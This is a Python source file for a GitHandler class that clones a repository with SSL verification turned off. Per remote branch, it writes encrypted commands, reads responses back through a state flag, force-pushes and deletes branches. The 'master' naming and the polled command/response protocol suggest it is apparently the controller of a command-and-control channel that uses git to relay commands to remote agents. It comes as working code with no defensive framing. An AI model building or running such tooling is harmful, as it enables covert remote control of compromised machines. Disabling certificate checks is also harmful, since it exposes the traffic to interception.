import git
import os
from datetime import datetime
from typing import List, Optional
from master.util import Config

class GitHandler:
    def __init__(self, config: Config):
        self.config = config
        self.repo = self._init_repository()

    def _init_repository(self) -> git.Repo:
        """Initialize or clone the repository"""
        # Ensure directory exists
        os.makedirs(self.config.local_repo_path, exist_ok=True)
        
        try:
            # Try to initialize existing repo
            repo = git.Repo(self.config.local_repo_path)
        except (git.exc.InvalidGitRepositoryError, git.exc.NoSuchPathError):
            # Clone new repository
            repo = git.Repo.clone_from(
                self.config.repo_url,
                self.config.local_repo_path,
                env={'GIT_ASKPASS': 'echo', 'GIT_SSL_NO_VERIFY': '1'}
            )
            
        # Configure repository
        with repo.config_writer() as config:
            config.set_value("http", "sslVerify", "false")
        
        return repo

    def get_active_branches(self) -> List[str]:
        """Get list of all branches"""
        try:
            self.repo.remote().fetch()
        except ValueError as e:
            if "Remote named 'origin' didn't exist" in str(e):
                # Re-initialize repository if remote is missing
                self.repo = self._init_repository()
                self.repo.remote().fetch()
            else:
                raise
        return [ref.name.replace('origin/', '') for ref in self.repo.remote().refs 
                if not ref.name.endswith('HEAD') and not ref.name == 'origin/main']

    def delete_branch(self, branch: str) -> bool:
        """Delete a branch locally and remotely"""
        try:
            # Reset and clean repository state
            self.repo.git.reset('--hard')
            self.repo.git.clean('-fd')
            
            # Switch to master/main first
            try:
                self.repo.git.checkout('main')
            except git.GitCommandError:
                try:
                    self.repo.git.checkout('master')
                except git.GitCommandError:
                    print("Could not find main or master branch")
                    return False

            # Delete remote branch first
            try:
                self.repo.git.push('origin', '--delete', branch)
                print(f"Deleted remote branch: {branch}")
            except git.GitCommandError as e:
                if "remote ref does not exist" not in str(e):
                    print(f"Failed to delete remote branch {branch}: {e}")
                    return False

            # Then delete local branch
            try:
                self.repo.git.branch('-D', branch)
                print(f"Deleted local branch: {branch}")
            except git.GitCommandError as e:
                if "branch not found" not in str(e):
                    print(f"Failed to delete local branch {branch}: {e}")

            return True
            
        except Exception as e:
            print(f"Error in delete_branch: {e}")
            return False

    def write_command(self, branch: str, command: str) -> bool:
        """Write encrypted command to branch"""
        try:
            self.repo.git.checkout(branch, '--force')  # Force checkout in case of conflicts
            
            # Check state first
            state_file = os.path.join(self.config.local_repo_path, "state")
            if os.path.exists(state_file):
                with open(state_file, "r") as f:
                    state = f.read().strip()
                if state != "2":
                    print(f"Cannot write command: state is {state}, must be 2")
                    return False
            
            # Write command and set state to 0
            command_file = os.path.join(self.config.local_repo_path, "command.txt")
            with open(command_file, "w") as f:
                f.write(command)
            with open(state_file, "w") as f:
                f.write("0")
                
            # Fetch latest changes from master and target branch
            self.repo.git.fetch('origin', 'master')
            self.repo.git.fetch('origin', branch)
            
            # Create new commit with our changes
            self.repo.index.add(["command.txt", "state"])
            self.repo.index.commit(f"New command for {branch}")
            
            try:
                # Rebase current branch on top of master
                self.repo.git.rebase('origin/master')
                
                # Force push the rebased changes
                self.repo.git.push('origin', branch, '--force')
            except git.GitCommandError as e:
                # If rebase fails, abort it and try force push
                try:
                    self.repo.git.rebase('--abort')
                except:
                    pass
                    
                # Force push our changes
                self.repo.git.push('origin', branch, '--force')
            return True
        except Exception as e:
            print(f"Error writing command: {e}")
            return False

    def get_last_commit_time(self, branch: str) -> Optional[datetime]:
        """Get the timestamp of the last commit on a branch"""
        try:
            # Reset any local changes and clean up
            self.repo.git.reset('--hard')
            self.repo.git.clean('-fd')
            
            # Fetch latest changes
            self.repo.git.fetch('origin', branch)
            
            # Try to get the commit time using git log
            try:
                timestamp = self.repo.git.log('-1', '--format=%ct', f'origin/{branch}')
                return datetime.fromtimestamp(int(timestamp))
            except git.GitCommandError:
                # If branch exists but has no commits
                return None
        except Exception as e:
            # Handle case where branch might have been deleted
            if "couldn't find remote ref" in str(e):
                return None
            print(f"Error getting last commit time for {branch}: {e}")
        return None

    def read_response(self, branch: str) -> Optional[str]:
        """Read response from branch"""
        try:
            # Reset any local changes
            self.repo.git.reset('--hard')
            self.repo.git.clean('-fd')
            
            # Fetch and checkout branch
            self.repo.git.fetch('origin', branch)
            self.repo.git.checkout('-B', branch, f'origin/{branch}')
            
            # Check state first
            state_file = os.path.join(self.config.local_repo_path, "state")
            if not os.path.exists(state_file):
                return None
                
            with open(state_file, "r") as f:
                state = f.read().strip()
                
            if state != "1":
                return None
                
            # Read response and update state
            response_file = os.path.join(self.config.local_repo_path, "response.txt")
            if os.path.exists(response_file):
                with open(response_file, "r") as f:
                    response = f.read().strip()
                if response:
                    # Update state to 2
                    with open(state_file, "w") as f:
                        f.write("2")
                    self.repo.index.add(["state"])
                    self.repo.index.commit("Mark response as read")
                    try:
                        self.repo.git.push('origin', branch, '--force')
                    except git.GitCommandError as e:
                        if "failed to push" in str(e):
                            # Force reset and push
                            self.repo.git.fetch('origin', branch)
                            self.repo.git.reset('--hard', f'origin/{branch}')
                            self.repo.git.push('origin', branch, '--force')
                    return response
        except Exception as e:
            print(f"Error reading response: {e}")
        return None
